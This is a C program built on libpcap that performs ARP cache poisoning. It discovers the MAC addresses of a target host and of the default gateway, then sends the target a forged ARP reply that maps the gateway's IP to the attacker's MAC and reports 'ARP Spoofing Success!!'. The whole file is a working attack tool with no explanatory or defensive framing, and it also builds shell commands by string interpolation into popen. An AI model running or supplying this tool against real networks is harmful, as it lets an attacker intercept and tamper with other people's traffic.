#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <netinet/ether.h>

pcap_t *handle;

int SendPacket(struct ether_addr dest, struct ether_addr sour, struct ether_addr send_mac, struct in_addr send_ip, struct ether_addr targ_mac, struct in_addr targ_ip, uint16_t opt)
{
	u_char packet[100];
	int length;
	struct ether_header eth_hdr;
	struct ether_arp arp_hdr;

	// ethernet
	memcpy(eth_hdr.ether_dhost, &dest.ether_addr_octet, 6);
	memcpy(eth_hdr.ether_shost, &sour.ether_addr_octet, 6);
	eth_hdr.ether_type = htons(ETHERTYPE_ARP);

	// arp
	arp_hdr.ea_hdr.ar_hrd = htons(1);
	arp_hdr.ea_hdr.ar_pro = htons(2048);
	arp_hdr.ea_hdr.ar_hln = 6;
	arp_hdr.ea_hdr.ar_pln = 4;
	arp_hdr.ea_hdr.ar_op = htons(opt);
	memcpy(&arp_hdr.arp_sha, &send_mac.ether_addr_octet, 6);
	memcpy(&arp_hdr.arp_spa, &send_ip.s_addr, 4);
	memcpy(&arp_hdr.arp_tha, &targ_mac.ether_addr_octet, 6);
	memcpy(&arp_hdr.arp_tpa, &targ_ip.s_addr, 4);

	memcpy(packet, &eth_hdr, 14);
	memcpy(packet + 14, &arp_hdr, sizeof(struct ether_arp));
	length = 14 + sizeof(struct ether_arp);
	if(length < 64)
	{
		for(int i = length; i < 64; i++)
			packet[i] = 0;
	}

	// send packet
	if(pcap_sendpacket(handle, packet, length) != 0)
	{
		fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
		return -1;
	}
	return 0;
}

int FindMAC(struct ether_addr *targ_mac, struct ether_addr my_mac, struct in_addr my_ip, struct in_addr targ_ip)
{
	struct ether_addr broad, gap;
	struct pcap_pkthdr *header;
	struct ether_header *eth_hdr;
	struct ether_arp *arp_hdr;
	const u_char *recv_packet;
	int res;

	ether_aton_r("FF:FF:FF:FF:FF:FF", &broad);
	ether_aton_r("00:00:00:00:00:00", &gap);
	if(SendPacket(broad, my_mac, my_mac, my_ip, gap, targ_ip, ARPOP_REQUEST) < 0)
		return -1;

	while((res = pcap_next_ex(handle, &header, &recv_packet)) >= 0)
	{
		if(res == 0) 
			continue;

		eth_hdr = (struct ether_header*)recv_packet;
		if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) 
			continue;

		arp_hdr = (struct ether_arp*)(recv_packet + 14);
		if(ntohs(arp_hdr->ea_hdr.ar_op) != ARPOP_REPLY) 
			continue;

		if(memcmp(&arp_hdr->arp_spa, &targ_ip.s_addr, 4) != 0) 
			continue;

		memcpy(&targ_mac->ether_addr_octet, &arp_hdr->arp_sha, 6);
		break;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;

	FILE* fp;

	char str[256], macbuf[20], ipbuf[20];
	struct ether_addr my_mac, targ_mac, gate_mac;
	struct in_addr my_ip, targ_ip, gate_ip;

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find the device: %s\n", errbuf);
		exit(1);
	}

	handle = pcap_open_live(dev, BUFSIZ, 0, -1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(1);
	}



	// Target IP 
	inet_aton(argv[1], &targ_ip);

	// My MAC
	sprintf(str, "ifconfig | grep '%s' | awk '{print $5}'", dev);
	fp = popen(str, "r");
	fgets(macbuf, sizeof(macbuf), fp);
	pclose(fp);

	printf("My MAC : %s", macbuf);
	ether_aton_r(macbuf, &my_mac);

	// My IP
	sprintf(str, "ifconfig | grep -A 1 '%s' | grep 'inet' | awk '{print $2}' | awk -F':' '{print $2}'", dev);
	fp = popen(str, "r");
	fgets(ipbuf, sizeof(ipbuf), fp);
	pclose(fp);

	printf("My IP : %s", ipbuf);
	inet_aton(ipbuf, &my_ip);

	// Gateway IP 
	sprintf(str, "netstat -r | grep 'default' | awk '{print $2}'");
	fp = popen(str, "r");
	fgets(ipbuf, sizeof(ipbuf), fp);
	pclose(fp);

	printf("Gateway IP : %s", ipbuf);
	inet_aton(ipbuf, &gate_ip);

	// Target MAC 
	if(FindMAC(&targ_mac, my_mac, my_ip, targ_ip) < 0)
		return 0;
	printf("Target MAC : %s\n", ether_ntoa(&targ_mac));

	// Gateway MAC
	if(FindMAC(&gate_mac, my_mac, my_ip, gate_ip) < 0)
		return 0;
	printf("Gateway MAC : %s\n", ether_ntoa(&gate_mac));

	// Reply
	if(SendPacket(targ_mac, my_mac, my_mac, gate_ip, targ_mac, targ_ip, ARPOP_REPLY) < 0)
		return 0;
	printf("ARP Spoofing Success!!\n");

	return 0;
}
